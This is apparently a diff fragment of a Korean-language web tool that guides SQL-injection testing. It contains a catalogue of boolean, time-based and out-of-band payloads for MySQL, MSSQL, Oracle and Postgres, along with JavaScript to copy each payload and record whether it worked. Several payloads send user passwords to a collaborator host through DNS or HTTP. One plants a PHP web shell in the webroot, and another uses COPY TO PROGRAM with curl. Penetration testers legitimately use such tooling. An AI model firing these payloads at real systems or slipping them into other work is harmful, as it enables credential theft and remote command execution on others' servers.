+      { tier:1, label:'DB명 첫 글자', code:"' AND SUBSTRING(DB_NAME(),1,1)='a'--" },
+      { tier:1, label:'테이블 존재 확인', code:"' AND (SELECT COUNT(*) FROM users)>0--" },
+    ],
+    oracle: [
+      { tier:1, label:'DB명 확인', code:"' AND SUBSTR((SELECT global_name FROM global_name),1,1)='a'--" },
+    ],
+    postgres: [
+      { tier:1, label:'DB명 첫 글자', code:"' AND SUBSTRING(current_database(),1,1)='a'--" },
+    ],
+  },
+  time: {
+    generic: [
+      { tier:1, label:'기본 지연 프로브', code:"' AND SLEEP(5)--", note:'DBMS에 따라 아래 전용 구문 사용' },
+    ],
+    mysql: [
+      { tier:1, label:'SLEEP 지연', code:"' AND SLEEP(5)--" },
+      { tier:1, label:'조건부 지연', code:"' AND IF(1=1,SLEEP(5),0)--" },
+      { tier:2, label:'DB명 첫 글자 조건부 지연', code:"' AND IF(SUBSTRING(database(),1,1)='a',SLEEP(5),0)--" },
+    ],
+    mssql: [
+      { tier:1, label:'WAITFOR DELAY', code:"'; WAITFOR DELAY '0:0:5'--" },
+      { tier:2, label:'조건부 지연', code:"'; IF (SELECT COUNT(*) FROM users)>0 WAITFOR DELAY '0:0:5'--" },
+    ],
+    oracle: [
+      { tier:1, label:'dbms_pipe 지연', code:"' AND 1=dbms_pipe.receive_message(('a'),5)--" },
+    ],
+    postgres: [
+      { tier:1, label:'pg_sleep 지연', code:"' AND pg_sleep(5)--" },
+      { tier:2, label:'조건부 지연', code:"' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)--" },
+    ],
+  },
+  oob: {
+    generic: [
+      { tier:1, label:'DNS 조회 (일반)', code:"' AND LOAD_FILE(CONCAT('\\\\\\\\',version(),'.collaborator.net\\\\x'))--", note:'Burp Collaborator 주소 사용' },
+    ],
+    mssql: [
+      { tier:1, label:'xp_dirtree DNS 조회', code:"'; EXEC master..xp_dirtree '//collab.net/a'--" },
+      { tier:1, label:'데이터 포함 OOB', code:"declare @p varchar(1024); set @p=(SELECT TOP 1 password FROM users);\nexec('master..xp_dirtree \"//'+@p+'.collab.net/a\"')--" },
+    ],
+    oracle: [
+      { tier:1, label:'UTL_HTTP OOB', code:"' UNION SELECT UTL_HTTP.REQUEST('http://collab.net/'||(SELECT password FROM users WHERE rownum=1)) FROM dual--" },
+      { tier:2, label:'UTL_FILE OOB', code:"' AND UTL_HTTP.request('http://collab.net/'||(SELECT banner FROM v$version WHERE rownum=1))=1--" },
+    ],
+    mysql: [
+      { tier:1, label:'LOAD_FILE DNS', code:"' AND LOAD_FILE(CONCAT('\\\\\\\\',database(),'.collab.net\\\\x'))--" },
+      { tier:2, label:'SELECT INTO OUTFILE', code:"' UNION SELECT '<?php system($_GET[cmd]);?>' INTO OUTFILE '/var/www/html/shell.php'--" },
+    ],
+    postgres: [
+      { tier:1, label:'COPY TO 웹서버', code:"COPY (SELECT password FROM users LIMIT 1) TO PROGRAM 'curl http://collab.net/?d=$(cat /dev/stdin)'--" },
+    ],
+  },
+};
+
+function renderPayloads() {
+  // DBMS tab selection: prefer arch.dbms, else generic
+  const preferred = S.arch.dbms || 'generic';
+  S.dbmsActive = preferred;
+
+  // render tabs
+  const tabWrap = document.getElementById('dbms-tabs');
+  tabWrap.innerHTML = DBMS_LIST.map(d =>
+    `<button class="dbms-tab${d.id===S.dbmsActive?' active':''}" onclick="switchDbms('${d.id}',this)">${esc(d.label)}</button>`
+  ).join('');
+
+  renderPayloadList();
+}
+
+function switchDbms(id, btn) {
+  S.dbmsActive = id;
+  document.querySelectorAll('.dbms-tab').forEach(t => t.classList.remove('active'));
+  btn.classList.add('active');
+  renderPayloadList();
+}
+
+function renderPayloadList() {
+  const vuln = S.vuln || 'generic';
+  const db = S.dbmsActive;
+  const source = PAYLOADS[vuln] || PAYLOADS.error;
+  const rows = (source[db] || []).concat(db !== 'generic' ? [] : []);
+  const genericRows = source['generic'] || [];
+  const dbRows = db !== 'generic' ? (source[db] || []) : [];
+  const allRows = db !== 'generic' ? [...genericRows, ...dbRows] : genericRows;
+
+  const tierNames = { 1:'Tier 1 — 우선 시도', 2:'Tier 2 — 대안', 3:'Tier 3 — 우회/심화' };
+  const grouped = {};
+  allRows.forEach(p => {
+    if (!grouped[p.tier]) grouped[p.tier] = [];
+    grouped[p.tier].push(p);
+  });
+
+  let html = '';
+  if (!allRows.length) {
+    html = '<div style="color:#8b95a1;font-size:13px;padding:16px 0">이 DBMS에 대한 페이로드가 없습니다. 공통(Generic) 탭을 확인하세요.</div>';
+  } else {
+    for (const tier of [1,2,3]) {
+      if (!grouped[tier]) continue;
+      html += `<div class="pl-section"><div class="pl-section-title">${esc(tierNames[tier])}</div>`;
+      for (const p of grouped[tier]) {
+        const id = 'pl_' + Math.random().toString(36).slice(2,8);
+        html += `<div class="pl-item" id="${id}">
+          <div class="pl-label">
+            <span class="tier tier-${p.tier}">T${p.tier}</span>
+            ${esc(p.label)}
+            ${p.note ? `<span style="font-weight:400;color:#aaa">— ${esc(p.note)}</span>` : ''}
+          </div>
+          <pre class="pl-code">${esc(p.code)}</pre>
+          <div class="pl-actions">
+            <button class="btn btn-ghost btn-sm" onclick="copyText(${JSON.stringify(p.code)},this)">복사</button>
+            <button class="rbtn rbtn-same" onclick="markPL('${id}','success',this)">성공</button>
+            <button class="rbtn rbtn-error" onclick="markPL('${id}','blocked',this)">차단/실패</button>
+          </div>
+        </div>`;
+      }
+      html += '</div>';
+    }
+  }
+  document.getElementById('payload-area').innerHTML = html;
+}
+
+function markPL(id, status, btn) {
+  const el = document.getElementById(id);
+  if (!el) return;
+  el.classList.remove('success', 'blocked');
+  el.classList.add(status);
+  S.plStats.tried++;
+  if (status === 'success') {
+    S.plStats.success++;
+    document.getElementById('success-banner').style.display = 'block';
+  }
+  updateFindings();
+}
+
+/* ── Findings sidebar ──────────────────────────────────── */
+const PARAM_LABELS = { numeric:'숫자형', string:'문자형', json:'JSON Body', xml:'XML/SOAP' };
+const SRC_LABELS   = { get:'GET', post:'POST Body', cookie:'Cookie', header:'HTTP 헤더' };
+const VULN_LABELS  = { error:'Error-based', union:'UNION-based', boolean:'Boolean Blind', time:'Time-based Blind', oob:'OOB' };
+
+function updateFindings() {
+  setText('f-param', S.arch.paramType ? PARAM_LABELS[S.arch.paramType] : '—');
+  setText('f-src',   S.arch.inputSrc  ? SRC_LABELS[S.arch.inputSrc]   : '—');
+  setText('f-dbms',  S.arch.dbms      ? S.arch.dbms.toUpperCase()      : '미확인');
+  setText('f-vuln',  S.vuln           ? VULN_LABELS[S.vuln]            : '—');
+
+  const filled = Object.values(S.probes).filter(Boolean).length;
+  setText('f-probes', filled ? `${filled}개 기록됨` : '—');
+}
+
+function setText(id, val) {
+  const el = document.getElementById(id);
+  if (el) el.textContent = val;
+}
+
+/* ── Utilities ─────────────────────────────────────────── */
+function esc(s) {
+  return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
+}
+
+function copyText(text, btn) {
+  navigator.clipboard.writeText(text).then(() => {
+    const t = document.getElementById('copy-toast');
+    t.style.opacity = '1';
+    setTimeout(() => t.style.opacity = '0', 1400);
+    if (btn) { const orig = btn.textContent; btn.textContent = '복사됨'; setTimeout(() => btn.textContent = orig, 1000); }
+  });
+}
+
+function resetAll() {
+  S.step = 1; S.arch = { paramType:null, inputSrc:null, dbms:'' };
+  S.probes = {}; S.vuln = null; S.dbmsActive = 'generic'; S.plStats = { tried:0, success:0 };
+  document.querySelectorAll('.radio-card').forEach(e => e.classList.remove('selected'));
+  document.getElementById('dbmsHint').value = '';
+  document.getElementById('success-banner').style.display = 'none';
+  goStepDirect(1);
+  updateFindings();
+}
+</script>
+</body>
+</html>
